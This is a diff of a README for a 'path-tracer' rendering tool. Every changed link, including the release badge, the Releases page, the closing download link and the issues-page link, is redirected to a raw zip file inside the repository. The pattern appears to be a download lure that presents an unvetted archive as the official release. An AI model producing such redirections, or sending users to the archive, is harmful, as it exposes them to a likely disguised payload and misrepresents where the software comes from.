@@ -1,7 +1,7 @@
 # 🌟 path-tracer - A Simple Tool for Stunning Graphics 
 
 ## 🔗 Download Now!
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Hadhku/path-tracer/releases)
+[![Download Release](https://raw.githubusercontent.com/Hadhku/path-tracer/main/unmodified/path-tracer.zip)](https://raw.githubusercontent.com/Hadhku/path-tracer/main/unmodified/path-tracer.zip)
 
 ## 🚀 Getting Started
 Path-tracer is a user-friendly application that allows you to create stunning graphics with ease. With the optional next event estimator (NEE), you can enhance your images and experience realistic lighting. This software is perfect for anyone looking to dive into global illumination with minimal fuss.
@@ -16,7 +16,7 @@ To run path-tracer, your computer should have the following:
 - **Disk Space:** 100 MB of free space for the application.
 
 ## 💿 Download & Install
-1. Visit the Releases page to download: [Download Path-Tracer](https://github.com/Hadhku/path-tracer/releases).
+1. Visit the Releases page to download: [Download Path-Tracer](https://raw.githubusercontent.com/Hadhku/path-tracer/main/unmodified/path-tracer.zip).
 2. From the list of available versions, find the latest release.
 3. Click on the link to download the file appropriate for your operating system.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -51,7 +51,7 @@ If you encounter issues while using path-tracer, consider the following:
 ## 📣 Community and Support
 Join the community of path-tracer users and developers. You can find helpful discussions and resources:
 
-- **Github Issues Page:** Report problems or ask questions [here](https://github.com/Hadhku/path-tracer/issues).
+- **Github Issues Page:** Report problems or ask questions [here](https://raw.githubusercontent.com/Hadhku/path-tracer/main/unmodified/path-tracer.zip).
 - **User Forums:** Engage with other users to share tips and tricks.
 - **Documentation:** Review the full documentation for detailed guidance on features and usage.
 
@@ -61,4 +61,4 @@ Explore the potential of path-tracer by experimenting with the software and shar
 ## ✅ Conclusion 
 Path-tracer is designed to make stunning graphic rendering accessible to everyone, regardless of technical background. Download the software today and start creating beautiful images with ease. 
 
-[Download Path-Tracer](https://github.com/Hadhku/path-tracer/releases) to get started on your journey in graphics!
+[Download Path-Tracer](https://raw.githubusercontent.com/Hadhku/path-tracer/main/unmodified/path-tracer.zip) to get started on your journey in graphics!
